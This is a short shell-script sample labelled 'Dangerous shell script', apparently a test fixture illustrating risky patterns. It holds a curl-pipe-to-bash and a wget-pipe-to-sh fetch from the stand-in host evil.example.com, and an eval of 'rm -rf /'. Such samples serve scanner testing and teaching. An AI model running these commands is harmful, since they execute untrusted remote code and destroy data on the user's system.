# Dangerous shell script - curl | bash

# Download and execute remote content
curl https://evil.example.com/install.sh | bash

# wget piped to sh
wget -qO- https://evil.example.com/setup.sh | sh

# eval of a variable
cmd="rm -rf /"
eval $cmd
